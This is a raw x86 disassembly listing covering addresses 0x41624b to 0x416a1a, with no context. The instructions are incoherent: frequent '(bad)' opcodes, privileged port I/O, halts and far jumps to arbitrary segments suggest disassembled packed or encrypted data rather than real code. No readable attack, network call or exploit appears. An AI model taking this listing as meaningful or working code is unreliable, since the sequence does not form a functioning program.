  41624b:	push   ebx
  41624c:	pop    ds
  41624d:	xor    dh,BYTE PTR ss:[esi+ebp*8-0x557b5de]
  416255:	dec    esi
  416256:	dec    edx
  416257:	not    ebx
  416259:	dec    ebp
  41625a:	cmp    al,bh
  41625c:	xchg   edx,eax
  41625d:	push   esi
  41625e:	jnp    0x4161f6
  416260:	pop    ds
  416261:	nop
  416262:	add    DWORD PTR [edi+0x5b],0xea9048fd
  416269:	pushf  
  41626a:	dec    esi
  41626b:	mov    ebx,0xe4433d5b
  416270:	popf   
  416271:	bound  ecx,QWORD PTR [edx+0x5]
  416274:	xchg   ebx,eax
  416275:	dec    ecx
  416276:	add    eax,0xd6c52bd6
  41627b:	xchg   ebp,eax
  41627c:	mov    eax,ds:0x8958520e
  416281:	and    al,0x45
  416283:	pop    ss
  416284:	leave  
  416285:	push   cs
  416286:	xlat   BYTE PTR ds:[ebx]
  416287:	popf   
  416288:	lods   eax,DWORD PTR ds:[esi]
  416289:	ds pop esi
  41628b:	adc    ecx,ecx
  41628d:	je     0x4162c3
  41628f:	push   edx
  416290:	neg    ah
  416292:	scas   eax,DWORD PTR es:[edi]
  416293:	js     0x4162d6
  416295:	popa   
  416296:	cmp    BYTE PTR [eax+0x6ecb7fff],ch
  41629c:	and    eax,0x40a6392e
  4162a1:	mov    bh,0xc1
  4162a3:	daa    
  4162a4:	loop   0x4162b5
  4162a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162a7:	pop    esp
  4162a8:	in     eax,dx
  4162a9:	lock hlt 
  4162ab:	pusha  
  4162ac:	ss cli 
  4162ae:	into   
  4162af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162b0:	and    BYTE PTR [ecx],dh
  4162b2:	mov    esi,0xd33c7eb4
  4162b7:	lods   eax,DWORD PTR ds:[esi]
  4162b8:	mov    eax,ds:0x25db39c0
  4162bd:	xchg   ecx,eax
  4162be:	or     al,0xb5
  4162c0:	cmp    dh,bl
  4162c2:	stos   DWORD PTR es:[edi],eax
  4162c3:	mov    ah,0x6c
  4162c5:	imul   esp,DWORD PTR cs:[esi+edx*2],0x5129204
  4162cd:	mov    ecx,0x8c55a988
  4162d2:	adc    al,0x38
  4162d4:	(bad)  
  4162d5:	in     al,dx
  4162d6:	adc    al,0x8e
  4162d8:	push   es
  4162d9:	aas    
  4162da:	push   ss
  4162db:	mov    bh,0x9d
  4162dd:	mov    bl,0x43
  4162df:	js     0x4162a8
  4162e1:	aas    
  4162e2:	xor    DWORD PTR [ebx-0x3e952320],esp
  4162e8:	into   
  4162e9:	cmp    BYTE PTR [ebx-0x75ad75ea],bl
  4162ef:	ret    
  4162f0:	push   esi
  4162f2:	dec    ecx
  4162f3:	sbb    eax,0x8d080d5c
  4162f8:	push   esi
  4162f9:	data16 into 
  4162fb:	add    BYTE PTR [eax],0x6
  4162fe:	rol    DWORD PTR ds:0x8335c08c,1
  416304:	in     al,dx
  416305:	add    ch,BYTE PTR [ebx+edx*4]
  416308:	sub    eax,DWORD PTR [ebx+ebx*8-0x4d]
  41630c:	jno    0x41634d
  41630e:	jnp    0x41631d
  416310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416311:	lods   al,BYTE PTR ds:[esi]
  416312:	jge    0x4162d2
  416314:	ret    
  416315:	mov    eax,ss:0xe2f624c0
  41631b:	jecxz  0x41630b
  41631d:	stos   BYTE PTR es:[edi],al
  41631e:	dec    edx
  41631f:	lahf   
  416320:	or     DWORD PTR [esi-0x6820c500],0x3a459607
  41632a:	xlat   BYTE PTR ds:[ebx]
  41632b:	inc    ecx
  41632c:	cwde   
  41632d:	outs   dx,DWORD PTR ds:[esi]
  41632e:	or     esi,DWORD PTR [esi+eax*1+0x7e9c3ac8]
  416335:	push   esi
  416336:	std    
  416337:	neg    DWORD PTR [ebx-0x7f8e0210]
  41633d:	ss push edx
  41633f:	outs   dx,BYTE PTR ds:[esi]
  416340:	jne    0x41634f
  416342:	aaa    
  416343:	loopne 0x4163b3
  416345:	xchg   esi,eax
  416346:	add    ebx,DWORD PTR [esi]
  416348:	fwait
  416349:	mov    al,0x6b
  41634b:	sbb    DWORD PTR [ebp-0x66],edx
  41634e:	or     eax,0xc5ef08e1
  416353:	push   eax
  416354:	xor    al,0xf3
  416356:	sbb    DWORD PTR [ecx-0x2b160f2c],0x29
  41635d:	(bad)  
  41635e:	test   al,0x28
  416360:	xor    esp,ebp
  416362:	cmp    ah,BYTE PTR [eax-0x7e5c37ee]
  416368:	icebp  
  416369:	fs shl eax,1
  41636c:	dec    esp
  41636d:	dec    edx
  41636e:	sbb    esp,DWORD PTR [ecx]
  416370:	jb     0x41631a
  416372:	and    edi,DWORD PTR [esp+eiz*2-0x6e]
  416376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416377:	(bad)  
  416378:	rol    eax,cl
  41637a:	xor    ebx,DWORD PTR fs:[eax+eiz*2]
  41637e:	pop    ebx
  41637f:	ret    
  416380:	ss and eax,eax
  416383:	sbb    DWORD PTR [edx],esp
  416385:	mov    bh,0xc8
  416387:	cmp    al,0x23
  416389:	xor    bl,al
  41638b:	cs lahf 
  41638d:	xor    esp,DWORD PTR [ebx-0x5ae5bbd]
  416393:	scas   al,BYTE PTR es:[edi]
  416394:	ret    
  416395:	mov    esi,0xc90312d3
  41639a:	adc    DWORD PTR [edi+0x64],0x59b819a2
  4163a1:	xor    al,0xe2
  4163a3:	sub    ch,BYTE PTR [eax+edx*4]
  4163a6:	mov    bh,0xac
  4163a8:	mov    esp,0x1f5f3dea
  4163ad:	adc    ah,BYTE PTR [ebp-0x2977f499]
  4163b3:	mov    WORD PTR [eax+ebp*8-0x4b4caa92],ss
  4163ba:	inc    edi
  4163bb:	gs ret 0xe0c0
  4163bf:	push   eax
  4163c0:	jae    0x416386
  4163c2:	ret    
  4163c3:	mov    ?,ebp
  4163c5:	sub    eax,0x7e9ff62e
  4163ca:	xchg   ecx,eax
  4163cb:	mov    ebp,0xf35571eb
  4163d0:	and    dh,dh
  4163d2:	push   edx
  4163d3:	jmp    0x2ae0:0x2bf1d624
  4163da:	xchg   dh,cl
  4163dc:	aam    0x9d
  4163de:	add    dl,BYTE PTR [ecx-0x3a74d6c7]
  4163e4:	jmp    0xe2a1:0xc505762f
  4163eb:	loope  0x41641a
  4163ed:	loopne 0x416396
  4163ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163f0:	sbb    DWORD PTR [eax-0x1c299a4a],0x63
  4163f7:	or     ecx,DWORD PTR [eax]
  4163f9:	pop    ss
  4163fa:	(bad)  
  4163fb:	es mov bh,0x12
  4163fe:	mov    ecx,DWORD PTR [edi+ecx*4-0x13]
  416402:	cmovl  ebp,DWORD PTR [ecx-0x30]
  416406:	ins    BYTE PTR es:[edi],dx
  416407:	fcmovu st,st(4)
  416409:	mov    edx,0x4b39d5ef
  41640e:	sub    al,0x87
  416410:	xchg   edi,eax
  416411:	(bad)  
  416412:	cmp    ecx,DWORD PTR [esi-0x30362e93]
  416418:	xchg   DWORD PTR [edi+edi*8-0x74d742e6],esp
  41641f:	aad    0x72
  416421:	icebp  
  416422:	retf   0x2dbb
  416425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416426:	std    
  416427:	cmp    ebx,DWORD PTR [ecx-0x7dd3791f]
  41642d:	sub    al,0x79
  41642f:	cld    
  416430:	sti    
  416431:	fdiv   DWORD PTR [ebp+0x1c]
  416434:	pop    ebp
  416435:	mov    cl,0xbc
  416437:	loope  0x4163ca
  416439:	ins    DWORD PTR es:[edi],dx
  41643a:	arpl   WORD PTR [ebx],bp
  41643c:	sub    ebp,ebp
  41643e:	dec    edi
  41643f:	pop    edi
  416440:	xor    ebp,ebp
  416442:	pop    eax
  416443:	jle    0x416465
  416445:	loope  0x41645b
  416447:	aam    0x9c
  416449:	push   cs
  41644a:	cmp    esi,DWORD PTR [esi-0x6a]
  41644d:	push   edx
  41644e:	xchg   esp,eax
  41644f:	or     al,0xe4
  416451:	xchg   ebx,eax
  416452:	mov    eax,0x1914fffd
  416457:	into   
  416458:	pushf  
  416459:	cs fwait
  41645b:	and    bh,BYTE PTR [ebx+eiz*4-0x20]
  41645f:	shl    DWORD PTR [esi+0x5bbc7472],1
  416465:	xor    dl,bl
  416467:	(bad)  
  416468:	nop
  416469:	mov    bh,BYTE PTR [edx-0x652626ac]
  41646f:	cwde   
  416470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416471:	pop    ds
  416472:	push   ss
  416473:	add    esi,ecx
  416475:	mov    ecx,0xb2ff8ebd
  41647a:	jae    0x416420
  41647c:	iret   
  41647d:	fistp  QWORD PTR [eax-0x47420e7]
  416483:	sub    eax,0xcf05c71e
  416488:	cmp    dl,ah
  41648a:	stos   BYTE PTR es:[edi],al
  41648b:	or     eax,0x71efed71
  416490:	je     0x4164f7
  416492:	das    
  416493:	adc    cl,BYTE PTR [ebp-0x35]
  416496:	sub    eax,0x3db2b09a
  41649b:	jmp    0x6fbf:0xc01e318
  4164a2:	jne    0x41647c
  4164a4:	cs fld st(3)
  4164a7:	push   ebx
  4164a8:	dec    edx
  4164a9:	and    DWORD PTR [ebp-0x111d2fc7],edi
  4164af:	mov    ebx,0x5a6b7437
  4164b4:	repz pop ds
  4164b6:	les    eax,FWORD PTR [ebx-0x74f45f9]
  4164bc:	sbb    eax,0x17a0c6b3
  4164c1:	data16 ss (bad) 
  4164c4:	in     eax,0xba
  4164c6:	jno    0x41652a
  4164c8:	or     dl,BYTE PTR [eax-0x142ca03]
  4164ce:	sub    bl,bh
  4164d0:	sub    eax,0x98f3ea21
  4164d5:	pop    edi
  4164d6:	test   al,0xe1
  4164d8:	iret   
  4164d9:	and    DWORD PTR [ebp-0x412a4364],esp
  4164df:	addr16 icebp 
  4164e1:	push   ebx
  4164e2:	lods   al,BYTE PTR ds:[esi]
  4164e3:	cmp    edx,ecx
  4164e5:	mov    edi,0xe16b308a
  4164ea:	mov    ecx,0xd116248a
  4164ef:	lea    ebx,[ebp+0x67fd8002]
  4164f5:	cdq    
  4164f6:	and    dl,ch
  4164f8:	pop    eax
  4164f9:	xor    al,0x16
  4164fb:	mov    bh,0x4e
  4164fd:	push   esi
  4164fe:	cmp    eax,0x6b03bfe1
  416503:	cld    
  416504:	aam    0x46
  416506:	pop    ecx
  416507:	fstp   TBYTE PTR [ebx+edi*4]
  41650a:	aas    
  41650b:	icebp  
  41650c:	ret    0xd03f
  41650f:	sbb    cl,BYTE PTR [esi+eiz*2-0x7a26a81d]
  416516:	push   eax
  416517:	rcr    dh,1
  416519:	and    eax,0xd8d41d1a
  41651e:	and    ah,BYTE PTR [esi]
  416520:	push   eax
  416521:	sbb    DWORD PTR [esi],edi
  416523:	xor    al,0x4f
  416525:	cmc    
  416526:	add    al,0x5b
  416528:	add    dh,BYTE PTR [ecx]
  41652a:	dec    DWORD PTR [ebp-0x581709ac]
  416530:	nop
  416531:	jns    0x416504
  416533:	popa   
  416534:	add    al,0xde
  416536:	jne    0x4164e2
  416538:	aaa    
  416539:	and    esi,DWORD PTR [ebp+0x12]
  41653c:	adc    edi,DWORD PTR [edi+eiz*1]
  41653f:	sbb    dl,ch
  416541:	xlat   BYTE PTR ds:[ebx]
  416542:	sub    edi,DWORD PTR [edi]
  416544:	aam    0x8
  416546:	inc    ecx
  416547:	(bad)
  41654a:	and    eax,0xffffffcc
  41654d:	leave  
  41654e:	rol    DWORD PTR [eax],cl
  416550:	js     0x416570
  416552:	loop   0x416583
  416554:	pop    ebx
  416555:	into   
  416556:	mov    ecx,0xebb973e
  41655b:	jg     0x416552
  41655d:	jb     0x4164e5
  41655f:	push   0xffffffde
  416561:	addr16 loop 0x41652d
  416564:	js     0x416512
  416566:	les    ebp,FWORD PTR [ebx-0x4d]
  416569:	lea    eax,ss:[edi+ebx*4+0x40]
  41656e:	inc    esi
  41656f:	and    al,al
  416571:	and    eax,0x629ac95f
  416576:	mov    bl,0xe5
  416578:	xor    DWORD PTR [edi],esp
  41657a:	inc    ecx
  41657b:	cmp    eax,0xc298aec1
  416581:	fsubr  DWORD PTR [esi-0x14]
  416584:	daa    
  416585:	cld    
  416586:	mov    ecx,DWORD PTR [ebx]
  416588:	popa   
  416589:	hlt    
  41658a:	or     eax,0x67ddae45
  41658f:	stos   DWORD PTR es:[edi],eax
  416590:	adc    eax,0x554d80b8
  416595:	jge    0x4165d3
  416597:	sub    bh,BYTE PTR [ecx+0x7c887124]
  41659d:	or     eax,0x9f74d7c9
  4165a2:	mov    ?,WORD PTR [ecx+0x26]
  4165a5:	test   BYTE PTR [ebx-0x9f4204],bl
  4165ab:	mov    edx,0xeec1162e
  4165b0:	and    edi,DWORD PTR [ecx+0x27f3ae0a]
  4165b6:	cwde   
  4165b7:	(bad)  
  4165b8:	mov    ?,WORD PTR [edx+ecx*2-0x41714f2a]
  4165bf:	add    al,0xb6
  4165c1:	dec    esp
  4165c2:	inc    eax
  4165c3:	push   edx
  4165c4:	pop    ebx
  4165c5:	sbb    esi,DWORD PTR [edx-0x56]
  4165c8:	push   edx
  4165c9:	in     eax,0xc8
  4165cb:	out    dx,al
  4165cc:	inc    esi
  4165cd:	cmp    ah,BYTE PTR cs:[eax+0xf0ec6c8]
  4165d4:	add    cl,BYTE PTR [eax+edx*8-0x3f99959d]
  4165db:	cmp    ebx,esi
  4165dd:	adc    ebp,DWORD PTR [ecx]
  4165df:	fldenv [eax-0x21]
  4165e2:	sbb    eax,0xd69f8b79
  4165e7:	(bad)  
  4165e8:	dec    esi
  4165e9:	ror    esi,0x48
  4165ec:	push   0xcd7f3565
  4165f1:	jp     0x41659f
  4165f3:	xor    DWORD PTR [ebx],0x757776b8
  4165f9:	(bad)  
  4165fa:	fisttp DWORD PTR [ecx-0x21]
  4165fd:	in     al,0x30
  4165ff:	jle    0x4165b1
  416601:	cmp    DWORD PTR [eax+eiz*8],0xffffff8e
  416605:	jl     0x4165ca
  416607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416608:	sahf   
  416609:	adc    BYTE PTR [edi+0x5f],cl
  41660c:	cs cmp eax,0xdd4b813d
  416612:	jle    0x4165f4
  416614:	cwde   
  416615:	push   eax
  416616:	and    DWORD PTR [edi],eax
  416618:	xchg   ecx,eax
  416619:	push   ds
  41661a:	out    0x6d,eax
  41661c:	jnp    0x416642
  41661e:	pop    ss
  41661f:	or     al,0xc6
  416621:	push   es
  416622:	imul   ecx,DWORD PTR [ebx+0x3933310c],0xffffff94
  416629:	jnp    0x416694
  41662b:	fadd   QWORD PTR [ecx-0x345e6914]
  416631:	dec    ebp
  416632:	and    eax,0x6c9aff24
  416637:	ja     0x4165cf
  416639:	jae    0x41665e
  41663b:	das    
  41663c:	and    BYTE PTR [eax+ebp*8+0x6fcefb6a],cl
  416643:	nop
  416644:	sbb    ah,BYTE PTR [ebx-0x16c18208]
  41664a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41664b:	add    eax,0x3669349
  416650:	push   eax
  416651:	jge    0x416629
  416653:	inc    ebx
  416654:	std    
  416655:	push   edi
  416656:	mov    edx,0xdfa5026
  41665b:	lea    edx,[edx+0x37]
  41665e:	ret    
  41665f:	inc    eax
  416660:	cmp    al,0x93
  416662:	das    
  416663:	jge    0x4166af
  416665:	xor    eax,0xc33fe470
  41666a:	add    al,BYTE PTR [edi]
  41666c:	(bad)  
  41666d:	cmp    ebp,DWORD PTR [esi]
  41666f:	cmp    eax,0x49a44e2d
  416674:	int    0xd1
  416676:	dec    ebp
  416677:	jb     0x4166a2
  416679:	cld    
  41667a:	divps  xmm7,XMMWORD PTR [edx+0x3dd0c46f]
  416681:	lar    eax,sp
  416684:	cmp    BYTE PTR [edx+0x2],bh
  416687:	fidivr WORD PTR [ecx]
  416689:	outs   dx,BYTE PTR ds:[esi]
  41668a:	dec    eax
  41668b:	push   es
  41668c:	jns    0x4166ab
  41668e:	pop    es
  41668f:	cmp    eax,0xa6502061
  416694:	icebp  
  416695:	inc    eax
  416696:	aam    0x2
  416698:	sbb    BYTE PTR [edx+0x58],al
  41669b:	fisub  DWORD PTR ds:0xd05a69a9
  4166a1:	pop    esi
  4166a2:	sti    
  4166a3:	mov    BYTE PTR [eax+0x5c63be83],0xa
  4166aa:	cli    
  4166ab:	sub    al,0x53
  4166ad:	cli    
  4166ae:	mov    bl,0x69
  4166b0:	test   al,bh
  4166b2:	(bad)  
  4166b3:	fimul  DWORD PTR [edi]
  4166b5:	leave  
  4166b6:	xchg   DWORD PTR [esi],edx
  4166b8:	enter  0x398b,0x7c
  4166bc:	icebp  
  4166bd:	retf   0x81a5
  4166c0:	ss loopne 0x4166c7
  4166c3:	das    
  4166c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166c5:	cld    
  4166c6:	lahf   
  4166c7:	iret   
  4166c8:	sub    BYTE PTR [ebx+0x31674179],bl
  4166ce:	stos   DWORD PTR es:[edi],eax
  4166cf:	jae    0x416691
  4166d1:	js     0x4166f8
  4166d3:	gs push ebp
  4166d5:	retf   
  4166d6:	sub    eax,0x22c3a1b0
  4166db:	lahf   
  4166dc:	jne    0x416670
  4166de:	sbb    eax,0x508ac283
  4166e3:	scas   al,BYTE PTR es:[edi]
  4166e4:	push   ecx
  4166e5:	(bad)  
  4166e6:	xchg   ecx,eax
  4166e7:	hlt    
  4166e8:	jg     0x416712
  4166ea:	inc    ecx
  4166eb:	jle    0x416693
  4166ed:	mov    esp,0xf3595df1
  4166f2:	int3   
  4166f3:	xchg   esi,eax
  4166f4:	sub    BYTE PTR [ecx-0x530558b2],dl
  4166fa:	test   eax,0xc7bd5e71
  4166ff:	idiv   DWORD PTR [ebp-0x1c]
  416702:	leave  
  416703:	lea    esp,[edx+0x1]
  416706:	cdq    
  416707:	lock xchg esi,eax
  416709:	mov    esi,0x112dd2a8
  41670e:	iret   
  41670f:	lahf   
  416710:	sbb    BYTE PTR [esi+0x505d7185],0x40
  416717:	dec    ecx
  416718:	push   edx
  416719:	sbb    dl,0xa1
  41671c:	dec    esp
  41671d:	sub    al,0x5c
  41671f:	test   al,0x7a
  416721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416722:	fs mov ch,0x2f
  416725:	shr    BYTE PTR [ebx-0x43685ec8],0xb3
  41672c:	addr16 push ebp
  41672e:	rol    BYTE PTR [ebx+0x605cd471],1
  416734:	jno    0x4166f6
  416736:	test   DWORD PTR [eax-0x3d51228],ebx
  41673c:	mov    ecx,edi
  41673e:	mov    edi,0xb55dc57c
  416743:	dec    eax
  416744:	pop    edx
  416745:	cmp    DWORD PTR [bp+si-0x5272],0x79
  41674b:	xchg   edi,eax
  41674c:	pusha  
  41674d:	inc    ebx
  41674e:	gs mov edi,0xe01be626
  416754:	xor    al,0x4
  416756:	popa   
  416757:	pop    eax
  416758:	mov    DWORD PTR cs:[esi-0x5a],ecx
  41675c:	adc    eax,0x4a33395b
  416761:	ret    
  416762:	sti    
  416763:	fsubr  QWORD PTR [ecx+ebp*4+0x52]
  416767:	mov    esp,0x9a20e91b
  41676c:	push   0x7f
  41676e:	lock fsub st(2),st
  416771:	mov    edi,0xfa0f9486
  416776:	in     eax,dx
  416777:	data16 into 
  416779:	(bad)  
  41677a:	push   ebx
  41677b:	js     0x4167e5
  41677d:	adc    eax,DWORD PTR [eax+edx*2+0x43]
  416781:	shl    DWORD PTR [edi-0x79],0x36
  416785:	retf   
  416786:	aaa    
  416787:	sub    esi,DWORD PTR [edx+0x69]
  41678a:	jbe    0x416769
  41678c:	jbe    0x4167a9
  41678e:	addr16 jg 0x416778
  416791:	jge    0x4167a1
  416793:	cmp    BYTE PTR [ecx-0x20dfe8e4],al
  416799:	outs   dx,BYTE PTR ds:[esi]
  41679a:	cs scas al,BYTE PTR es:[edi]
  41679c:	lock mov dl,0x80
  41679f:	(bad)  
  4167a0:	sbb    eax,0x77667ad9
  4167a5:	cmp    esp,DWORD PTR [edi]
  4167a7:	andps  xmm5,XMMWORD PTR [esi+0x16296954]
  4167ae:	repz not BYTE PTR ds:0x5c5205d2
  4167b5:	sbb    al,0xf0
  4167b7:	ss xchg ebp,eax
  4167b9:	into   
  4167ba:	pop    esi
  4167bb:	mov    bl,BYTE PTR [ebp-0x7c4747c0]
  4167c1:	cmc    
  4167c2:	xor    al,0x12
  4167c4:	push   eax
  4167c5:	jae    0x416812
  4167c7:	shl    DWORD PTR [ebp+0x1a061d19],0xb5
  4167ce:	mov    ah,0x44
  4167d0:	mov    edx,0xd13fc7fc
  4167d5:	sub    esi,DWORD PTR [eax+0x0]
  4167d8:	jno    0x4167ff
  4167da:	retf   
  4167db:	not    BYTE PTR [ecx+0x31bed6e8]
  4167e1:	mov    WORD PTR [ebx-0x2d],cs
  4167e4:	mov    bh,0xc3
  4167e6:	dec    edi
  4167e7:	les    ebx,FWORD PTR [edx-0x80]
  4167ea:	stc    
  4167eb:	leave  
  4167ec:	lea    edi,[edx+0x30]
  4167ef:	nop
  4167f0:	daa    
  4167f1:	hlt    
  4167f2:	fstp   DWORD PTR [edx+0x72]
  4167f5:	jmp    0x30c8201b
  4167fa:	sbb    eax,0xebe15e68
  4167ff:	stos   BYTE PTR es:[edi],al
  416800:	dec    ecx
  416801:	push   cs
  416802:	inc    edi
  416803:	sbb    BYTE PTR [ecx+0x27bce607],0x96
  41680a:	push   ss
  41680b:	les    esi,FWORD PTR [ebp+eiz*1-0x2c]
  41680f:	mov    BYTE PTR ds:0xaa43be62,0xa2
  416816:	push   edx
  416817:	xchg   esi,eax
  416818:	test   eax,0x5951c32a
  41681d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41681e:	inc    esi
  41681f:	and    ah,0xef
  416822:	frstor [edx]
  416824:	sub    ch,cl
  416826:	mov    esp,0x4dbe941e
  41682b:	pop    eax
  41682c:	leave  
  41682d:	add    eax,0xa680502a
  416832:	jl     0x416887
  416834:	xor    bx,WORD PTR [edi]
  416837:	cmp    BYTE PTR fs:[ebp+0x62cca319],al
  41683e:	jo     0x41685a
  416840:	push   0x4c4b6ced
  416845:	outs   dx,DWORD PTR ds:[esi]
  416846:	adc    DWORD PTR [edi-0x13],eax
  416849:	dec    ecx
  41684a:	push   cs
  41684b:	cmp    al,0xc2
  41684d:	and    DWORD PTR [edx+0x6206fdab],edx
  416853:	jg     0x416805
  416855:	cmp    dl,BYTE PTR [edi]
  416857:	rol    BYTE PTR ss:[ecx+0xe7de095],cl
  41685e:	rcl    dh,1
  416860:	adc    eax,DWORD PTR [edx-0x4d6ecc10]
  416866:	add    DWORD PTR [ecx],ecx
  416868:	je     0x4168de
  41686a:	hlt    
  41686b:	pop    eax
  41686c:	ja     0x416822
  41686e:	fwait
  41686f:	lds    esp,FWORD PTR [ecx]
  416871:	lds    esi,FWORD PTR [esi]
  416873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416874:	mov    bl,0x39
  416876:	sti    
  416877:	or     al,BYTE PTR [eax+0x4d]
  41687a:	(bad)  
  41687b:	(bad)  
  41687c:	stc    
  41687d:	jnp    0x416818
  41687f:	xor    cl,bl
  416881:	sbb    cl,BYTE PTR [edi+0x63]
  416884:	rcr    edi,cl
  416886:	fs dec edi
  416888:	cmp    BYTE PTR [eax+esi*4-0x15167461],dh
  41688f:	(bad)  
  416890:	pop    ecx
  416891:	mov    eax,ds:0xf57d1a0
  416896:	pop    edi
  416897:	xor    dh,BYTE PTR [edx-0x62a4b876]
  41689d:	shl    dh,1
  41689f:	and    eax,edx
  4168a1:	ins    BYTE PTR es:[edi],dx
  4168a2:	jns    0x416904
  4168a4:	mov    edi,ds
  4168a6:	lds    ebx,FWORD PTR [edi-0x768dcf53]
  4168ac:	xor    al,0xdb
  4168ae:	sub    ecx,0x3f
  4168b1:	and    edx,DWORD PTR [eax]
  4168b3:	pop    esp
  4168b4:	dec    ebp
  4168b5:	dec    ebp
  4168b6:	aam    0x35
  4168b8:	outs   dx,DWORD PTR ds:[esi]
  4168b9:	mov    esi,0xafeba973
  4168be:	and    al,0xb1
  4168c0:	adc    al,0xe
  4168c2:	push   esi
  4168c3:	ins    BYTE PTR es:[edi],dx
  4168c4:	out    dx,al
  4168c5:	shr    bl,1
  4168c7:	mov    bh,0xc0
  4168c9:	mov    esi,0x817c6f25
  4168ce:	scas   al,BYTE PTR es:[edi]
  4168cf:	xor    dl,ch
  4168d1:	sbb    al,BYTE PTR [edi+0x15e92564]
  4168d7:	aas    
  4168d8:	ins    BYTE PTR es:[edi],dx
  4168d9:	lahf   
  4168da:	jae    0x416958
  4168dc:	and    al,0x94
  4168de:	cmp    edi,DWORD PTR [eax-0x4f2979e6]
  4168e4:	and    BYTE PTR [eax],dl
  4168e6:	(bad)  
  4168e8:	test   eax,0x96a39716
  4168ed:	inc    eax
  4168ee:	ret    
  4168ef:	dec    esp
  4168f0:	mov    eax,ds:0xc6d3997e
  4168f5:	sbb    BYTE PTR [ebx],0x15
  4168f8:	add    al,0xb0
  4168fa:	push   0xffffffe5
  4168fc:	dec    BYTE PTR [esi+0x64]
  4168ff:	ss popf 
  416901:	fdiv   QWORD PTR [eax-0x5f]
  416904:	iret   
  416905:	aas    
  416906:	dec    ebp
  416907:	inc    edx
  416908:	mov    ch,0xf1
  41690a:	es inc edx
  41690c:	adc    BYTE PTR [edx+esi*1],al
  41690f:	dec    ebp
  416910:	out    0x1f,eax
  416912:	ret    0xcce0
  416915:	in     eax,0xdf
  416917:	hlt    
  416918:	mov    dl,0x86
  41691a:	icebp  
  41691b:	push   edi
  41691c:	bound  edx,QWORD PTR [ecx]
  41691e:	jo     0x4168ee
  416920:	push   es
  416921:	push   ecx
  416922:	ficomp DWORD PTR [ecx-0x7a]
  416925:	test   esi,eax
  416927:	jno    0x4168b9
  416929:	xchg   ebx,eax
  41692a:	push   ss
  41692b:	leave  
  41692c:	rcl    BYTE PTR [edx+ebx*8+0x63b463fc],0x24
  416934:	dec    esi
  416935:	xchg   edx,eax
  416936:	add    al,0x80
  416938:	sti    
  416939:	fsubr  DWORD PTR [edi]
  41693b:	icebp  
  41693c:	in     eax,dx
  41693d:	cmp    DWORD PTR [ebx+0x45],ebp
  416940:	outs   dx,BYTE PTR ds:[esi]
  416941:	fcomp  QWORD PTR [edx-0x26]
  416944:	push   ebx
  416945:	mov    ebx,0xa840fef8
  41694a:	pop    ss
  41694b:	jb     0x4169b9
  41694d:	cmp    esp,DWORD PTR [edi+0x72]
  416950:	outs   dx,DWORD PTR ds:[esi]
  416951:	pop    ecx
  416952:	xchg   BYTE PTR [ecx-0x3f],al
  416955:	test   eax,0x2f6c3e3c
  41695a:	fmul   QWORD PTR [edi-0x573ed4cf]
  416960:	dec    ecx
  416961:	sbb    eax,DWORD PTR [edx+0x45]
  416964:	imul   ecx,DWORD PTR [eax],0xac664a20
  41696a:	inc    ebp
  41696b:	addr16 popf 
  41696d:	test   BYTE PTR [ecx+edi*2-0x30297881],ch
  416974:	mov    esi,0xb305b9b3
  416979:	jge    0x4169f4
  41697b:	adc    ch,0xb5
  41697e:	pop    edx
  41697f:	and    eax,DWORD PTR [ebx]
  416981:	into   
  416982:	inc    ebp
  416983:	cmp    al,0xba
  416985:	cmp    BYTE PTR ds:0x9523295,al
  41698b:	inc    esp
  41698c:	adc    DWORD PTR [edx-0x11],ebx
  41698f:	cmp    ah,al
  416991:	xchg   ecx,eax
  416992:	rol    dh,1
  416994:	add    al,0xcd
  416996:	sub    ch,bl
  416998:	lds    edi,FWORD PTR [edx+0x6f7fd1a]
  41699e:	and    eax,0x471cd698
  4169a3:	adc    BYTE PTR [ebp+0x1d],cl
  4169a6:	xchg   edx,eax
  4169a7:	jp     0x41692d
  4169a9:	retf   
  4169aa:	shl    BYTE PTR [edi],cl
  4169ac:	mov    eax,DWORD PTR [eax+0x36]
  4169af:	jecxz  0x416940
  4169b1:	xor    ebp,DWORD PTR ds:0x1d4759f0
  4169b7:	pop    ecx
  4169b8:	mov    dl,0xdf
  4169ba:	sti    
  4169bb:	in     al,0x47
  4169bd:	dec    esi
  4169be:	xchg   esi,eax
  4169bf:	lods   al,BYTE PTR ds:[esi]
  4169c0:	fst    DWORD PTR [esi-0x4e]
  4169c3:	dec    ebp
  4169c4:	and    edi,DWORD PTR [edx]
  4169c6:	adc    ecx,DWORD PTR [esi+0x520478b6]
  4169cc:	mov    eax,eax
  4169ce:	gs jle 0x4169c0
  4169d1:	xchg   ebp,eax
  4169d2:	add    al,0x3a
  4169d4:	cld    
  4169d5:	gs hlt 
  4169d7:	mov    esi,ebp
  4169d9:	xor    al,0x6
  4169db:	jmp    FWORD PTR [edi]
  4169dd:	and    ah,BYTE PTR [esi+0x2a0e689e]
  4169e3:	out    dx,eax
  4169e4:	sbb    ebp,DWORD PTR [edi+0x31]
  4169e7:	les    eax,FWORD PTR [esi-0x38]
  4169ea:	jae    0x416a17
  4169ec:	mov    cl,dh
  4169ee:	neg    DWORD PTR ds:0x248b6de3
  4169f4:	mov    bh,BYTE PTR [ecx-0xc]
  4169f7:	ins    BYTE PTR es:[edi],dx
  4169f8:	call   0x76f0:0x536a4b89
  4169ff:	cli    
  416a00:	retf   
  416a01:	jae    0x416a3b
  416a03:	pop    ecx
  416a04:	push   edx
  416a05:	ds sbb eax,0xfe346f40
  416a0b:	clc    
  416a0c:	inc    esi
  416a0d:	xor    esi,esi
  416a0f:	neg    dh
  416a11:	push   ss
  416a12:	cmp    DWORD PTR [ecx+ecx*4],ecx
  416a15:	jmp    0x416a5c
  416a17:	and    bh,al
  416a19:	lods   al,BYTE PTR ds:[esi]
  416a1a:	or     edx,DWORD PTR [eax]
